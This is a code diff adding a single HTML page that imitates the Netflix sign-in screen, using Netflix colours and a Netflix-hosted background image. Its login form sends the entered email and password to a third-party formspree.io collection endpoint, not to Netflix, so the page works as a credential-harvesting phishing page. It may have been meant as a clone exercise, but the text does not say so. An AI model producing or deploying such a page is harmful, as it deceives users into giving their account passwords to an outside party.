@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deepanshu Netflix Login Form</title>
+        <style>
+    body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-repeat: no-repeat;
+        background-size: cover;
+        background: url('https://help.nflxext.com/43e0db2f-fea0-4308-bfb9-09f2a88f6ee4_what_is_netflix_1_en.png');
+        opacity: 0.92;
+    }
+    .container {
+        max-width: 400px;
+        margin: 150px auto;
+        padding: 20px;
+        background-color: #1d1919;
+        border-radius: 5px;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+    h2 {
+        text-align: center;
+        color: #fff;
+        margin-bottom: 20px;
+    }
+    input[type="text"],
+    input[type="password"],
+    input[type="submit"] {
+        width: 100%;
+        color: #fff;
+        padding: 10px;
+        margin-bottom: 10px;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+        box-sizing: border-box;
+    }
+    label{
+        color: #fff;
+    }
+    input[type="submit"] {
+        background-color: #e50914;
+        color: #fff;
+        border: none;
+        cursor: pointer;
+    }
+    input[type="submit"]:hover {
+        background-color: #c90000;
+    }
+    .checkbox {
+        margin-bottom: 10px;
+    }
+    .forgot-password {
+        text-align: center;
+        margin-top: 10px;
+        color: #555;
+    }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h2>Sign In</h2>
+            <form action="https://formspree.io/f/mjvnplal" method="post">
+                <label for="email">Email</label>
+                <input
+                    type="text"
+                    id="email"
+                    name="email"
+                    required
+                >
+                <label for="password">Password</label>
+                <input
+                    type="password"
+                    id="password"
+                    name="password"
+                    required
+                >
+                <div class="checkbox">
+                    <input type="checkbox" id="remember-me" name="remember-me">
+                    <label for="remember-me">Remember Me</label>
+                </div>
+                <input type="submit">
+                <p class="forgot-password">
+                    <a href="register.html">Forgot password?</a>
+                    <a href="register.html" style="color: #0421ff;">Register now</a>
+                </p>
+            </form>
+        </div>
+    </body>
+</html>
